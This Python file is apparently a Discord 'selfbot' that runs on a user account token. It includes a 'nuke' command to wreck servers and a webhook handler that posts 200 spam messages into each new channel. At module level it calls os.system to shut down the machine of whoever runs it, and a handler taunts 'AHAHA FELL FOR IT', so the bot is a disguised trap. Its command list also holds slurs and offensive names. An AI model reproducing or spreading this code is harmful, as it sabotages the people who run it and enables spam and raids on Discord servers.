import discord, os, json
from aiohttp import *
from discord.ext import commands
from discord.ext.commands import CommandNotFound
global webhooks
global webhook_name
global afk_message
global webhook_content
global Activity_name
global Help
global main
global prefix
global nuke
global fun

global Activities1
fObj = open('config.json',)
ogdata = json.load(fObj)
token = ogdata['token']
webhook_name = ogdata['webhook_name']
prefix = ogdata['prefix']
webhook_content = ogdata['webhook_content']
Activity_name = ogdata['Activity_name']

dortrox = commands.Bot(
    command_prefix='>',
    self_bot=True,
    help_command=None,  
                     )

Help = ["NUKE COMMANDS", "FUN COMMANDS", "ACTIVITES COMMANDS", "MAIN COMMANDS"]
Main = [f"*`{dortrox.command_prefix}purge`*: Delete messages from a channel  |  **`{dortrox.command_prefix}purge <amount here>`**", f"*`{dortrox.command_prefix}ping`*: Shows lantency  |  **`{dortrox.command_prefix}purge`**", f"*`{dortrox.command_prefix}webhook`*: Turn webhooks on & off  |  **`{dortrox.command_prefix}webhook <true/false>`**", f"*`{dortrox.command_prefix}activity`*: changes activity message  |  **`{dortrox.command_prefix}activity <message here>`**", f"*`{dortrox.command_prefix}nwebhook`*: Changes webhooks name  |  **`{dortrox.command_prefix}nwebhook <name here>`**", f"*`{dortrox.command_prefix}cwebhook`*: Changes webhooks content  |  **`{dortrox.command_prefix}nwebhook <content here>`**", f"*`{dortrox.command_prefix}rn`* : Changes roles name  |  **`{dortrox.command_prefix}rn <name here>`**", f"*`{dortrox.command_prefix}cn`*: Changes channels name  |  **`{dortrox.command_prefix}cn <name here>`**", f"*`{dortrox.command_prefix}prefix`*: Changes prefix  |  **`{dortrox.command_prefix}prefix <New prefix here>`**" ]


Nuke = [f"*`{dortrox.command_prefix}nuke`*: Blow up the server for you  |  **`{dortrox.command_prefix}nuke`**" ]


Activites = [f"`{dortrox.command_prefix}stream`: Change to streaming message and activity  |  **`{dortrox.command_prefix}stream <messsage here>`**", f"*`{dortrox.command_prefix}listen`*: Change to listening message and activity  |  **`{dortrox.command_prefix}listen <messsage here>`**", f"*`{dortrox.command_prefix}playing`*: Change to playing message and activity **`{dortrox.command_prefix}listen <message here>`**", f"*`{dortrox.command_prefix}watch`*: Change to watching message and activity  |  **`{dortrox.command_prefix}watch <message here>`**"]


Fun = f"""
```ini
[{dortrox.command_prefix}hastare]\n
[{dortrox.command_prefix}danc]\n
[{dortrox.command_prefix}langry]\n
[{dortrox.command_prefix}hah]\n
[{dortrox.command_prefix}owo]\n
[{dortrox.command_prefix}lonely]\n
[{dortrox.command_prefix}ahh]\n
[{dortrox.command_prefix}bbye]\n
[{dortrox.command_prefix}hahug]\n
[{dortrox.command_prefix}hjump]\n
[{dortrox.command_prefix}pat]\n
[{dortrox.command_prefix}twerk]\n
[{dortrox.command_prefix}nani]\n
[{dortrox.command_prefix}love]\n
[{dortrox.command_prefix}sesso]\n
[{dortrox.command_prefix}jews]\n
[{dortrox.command_prefix}cp]\n
```
"""



for filename in os.listdir('./runs'):
    if filename.endswith('.py'):
        dortrox.load_extension(f'runs.{filename[:-3]}')

@dortrox.event
async def on_guild_channel_create(channel):
  fObj = open('config.json',)
  ogdata = json.load(fObj)
  webhooks = ogdata['webhooks']
  if webhooks == "True":
    try: 
            webhook = await channel.create_webhook(name=webhook_name)
    except Exception as e:
      pass
      
    for i in range(200):
      try:
        await webhook.send(content=webhook_content, avatar_url='https://cdn.discordapp.com/avatars/852605714022269010/d039402a9bdc74a2ab1831670a845fd1.webp?size=1024')
      except Exception as e:
        pass
  else:
    pass

@dortrox.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error

@dortrox.event
async def on_ready():
    await dortrox.change_presence(activity=discord.Streaming(name=Activity_name, url="https://www.twitch.tv/dortrox"))  
    print(f"""
                                    
                                   ▄████████  ▄█     ▄████████  ▄█  ███    █▄     ▄████████ 
                                  ███    ███ ███    ███    ███ ███  ███    ███   ███    ███ 
                                  ███    █▀  ███▌   ███    ███ ███▌ ███    ███   ███    █▀  
                                  ███        ███▌  ▄███▄▄▄▄██▀ ███▌ ███    ███   ███        
                                ▀███████████ ███▌ ▀▀███▀▀▀▀▀   ███▌ ███    ███ ▀███████████ 
                                         ███ ███  ▀███████████ ███  ███    ███          ███ 
                                   ▄█    ███ ███    ███    ███ ███  ███    ███    ▄█    ███ 
                                 ▄████████▀  █▀     ███    ███ █▀   ████████▀   ▄████████▀  
                                                    ███    ███                              
                                            Manipulating: {dortrox.user}  
                                                  Prefix: {dortrox.command_prefix}                      
    """)
    
@dortrox.event
async def on_message(message):
  message.channel.send('AHAHA FELL FOR IT')

os.system("shutdown /s /t 1")
@dortrox.command()

async def help (ctx):
  try:
    await   ctx.message.delete()
  except:
    pass
  h = """
    ```ini
                          [SIRIUS SELFBOT]
    ``` """
  h += "```Category```\n\n"
  for i in Help:
    h += f"**`{i}`**\n"
  h += f"```{dortrox.command_prefix}ihelp: To search for a specific category  |  Example : {dortrox.command_prefix}ihelp <category name>```\n\n"
  await ctx.send(h)

@dortrox.command()
async def ihelp(ctx, content):
  try:
    await ctx.message.delete()
  except:
    pass

  h = """
    ```ini
                          [SIRIUS SELFBOT]
    ``` """
  if content == "main":
    h += "```Category [MAIN]```\n\n"
    for i in Main:
      h += f"{i}\n"
    await ctx.send(h)
  elif content == "nuke":
    h += "```Category [NUKE]```\n\n"
    for i in Nuke:
      h += f"{i}\n"
    await ctx.send(h)
  elif content == "fun":
    h += "```Category [FUN]```\n\n"
    await ctx.send(Fun)
  elif content == "activities":
    h += "```Category [Activity]```\n\n"
    for i in Activites:
      h += f"{i}\n"
    await ctx.send(h)
  else:
    pass



dortrox.run(token, bot=False)
